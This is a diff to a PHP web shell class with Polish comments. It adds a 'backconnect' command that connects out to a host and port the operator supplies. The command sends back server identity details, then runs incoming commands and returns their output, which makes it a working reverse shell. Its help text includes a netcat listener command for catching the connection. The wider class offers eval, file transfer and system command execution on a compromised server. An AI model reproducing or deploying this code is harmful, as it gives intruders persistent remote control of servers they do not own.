@@ -15,13 +15,13 @@ require_once __DIR__ . '/Html.php';
 /**
  * class Shell - Zarzadzanie serwerem ;)
  *
- * @version    0.1
+ * @version    0.11
  *
  * @todo
  *      MysqlDumper - oparty na poleceniu systemowym mysqldump oraz bibliotece PHP MysqlDumper
  *      Edycja pliku
  *      Tworzenie katalogow
- *      Backconnect, Binder
+ *      Binder
  *      Inne przydatne dziwactwa, ktore sie przydadza
  *
  * @uses       Request
@@ -158,7 +158,7 @@ class Shell
 		 */
 		$sPhpInfo = <<<CONTENT
 
-phpinfo
+//phpinfo
 CONTENT;
 
 		$this -> sPhpInfo = substr( $sPhpInfo, -7 );
@@ -483,6 +483,81 @@ HELP;
 		fclose( $rSock );
 
 		return 'Plik został przesłany';
+	}
+
+	/**
+	 * Komenda - backconnect
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandBackConnect()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+backconnect, bc - Połączenie zwrotne
+
+	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki
+
+	Użycie:
+		backconnect host:port
+
+		komenda ":exit" zamyka połączenie
+
+		najlepiej uruchomić w nowym oklnie
+
+	Przykład:
+		backconnect localhost:6666
+
+	NetCat:
+		nc -vv -l -p 6666
+HELP;
+		}
+
+		$aHost = $this -> getHost( $this -> aArgv[0] );
+
+		/**
+		 * Port jest wymagany
+		 */
+		if( $aHost[1] === 0 )
+		{
+			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
+		}
+
+		/**
+		 * Polaczenie z hostem
+		 */
+		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 5 ) ) === FALSE )
+		{
+			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
+		}
+
+		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot# ", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
+		/**
+		 * BC
+		 */
+		for(;;)
+		{
+			$sCmd = rtrim( fread( $rSock, 1024 ) );
+			if( $sCmd === ':exit' )
+			{
+				fwrite( $rSock, "\r\nbye ;)" );
+				exit ;
+			}
+			else if( empty( $sCmd ) )
+			{
+				continue ;
+			}
+
+			fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+			fwrite( $rSock, "\r\nroot#" );
+		}
+
+		exit ;
 	}
 
 	/**
@@ -1270,26 +1345,26 @@ HELP;
 	 * @access private
 	 * @return string
 	 */
-	private function getActionBrowser()
+	private function getActionBrowser( $sCmd = NULL )
 	{
+		if( $sCmd !== NULL )
+		{
+			$bRaw = TRUE;
+		}
+
 		/**
 		 * Zawartosc konsoli
 		 */
 		$sConsole = NULL;
 
 		/**
-		 * Komenda
-		 */
-		$sCmd = NULL;
-
-		/**
 		 * Domyslna komenda to :ls -lR sciezka_do_katalogu
 		 */
-		if( ! Request::isPost() )
+		if( ( $sCmd === NULL ) && ! Request::isPost() )
 		{
 			$sCmd = ':ls -lR ' . dirname( __FILE__ );
 		}
-		else
+		else if( $sCmd === NULL )
 		{
 			$sCmd = (string) Request::getPost( 'cmd' );
 		}
@@ -1350,6 +1425,10 @@ HELP;
 			{
 				case 'echo':
 					$sConsole = $this -> getCommandEcho();
+					break ;
+				case 'backconnect':
+				case 'bc':
+					$sConsole = $this -> getCommandBackConnect();
 					break ;
 				case 'eval':
 					$sConsole = $this -> getCommandEval();
@@ -1454,6 +1533,12 @@ HELP;
 		else
 		{
 			$sConsole = 'Safe mode jest włączone, więc exec, shell_exec, passthru, system i fopen nie zadziałają';
+		}
+
+		if( $bRaw )
+		{
+			return strip_tags( $sConsole );
+			exit ;
 		}
 
 		$sContent  = sprintf( '<pre id="console">%s</pre><br />', $sConsole );
